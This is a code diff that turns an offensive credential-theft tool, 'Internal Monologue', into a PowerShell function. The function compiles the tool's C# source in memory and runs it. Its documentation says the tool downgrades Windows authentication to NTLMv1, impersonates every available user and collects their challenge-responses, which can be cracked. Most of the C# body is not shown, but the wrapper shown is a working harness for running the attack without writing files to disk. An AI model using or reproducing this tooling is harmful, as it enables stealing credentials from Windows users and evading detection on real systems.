@@ -1,4 +1,24 @@
-﻿using System;
+function Invoke-InternalMonolouge
+{
+<#
+.SYNOPSIS
+Retrieves NTLMv1 challenge-response for all available users
+
+.DESCRIPTION
+Downgrades to NTLMv1, impersonates all available users and retrieves a challenge-response for each.
+	
+Author: Elad Shamir (https://linkedin.com/in/eladshamir)
+
+.EXAMPLE
+Invoke-InternalMonolouge
+
+.LINK
+https://github.com/eladshamir/Internal-Monologue
+
+#>
+
+$Source = @"
+using System;
 using System.Security.Principal;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -374,7 +394,7 @@ namespace InternalMonologue
         //Maintains a list of handled users
         static List<string> authenticatedUsers = new List<string>();
 
-        public static void Main(string[] args)
+        public static void Main()
         {
             //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
             if (IsElevated())
@@ -664,4 +684,16 @@ namespace InternalMonologue
         SecurityImpersonation,
         SecurityDelegation
     }
+}
+
+"@
+
+$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
+$inmem.GenerateInMemory=1
+$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))
+
+Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem 
+
+[InternalMonologue.Program]::Main()
+
 }
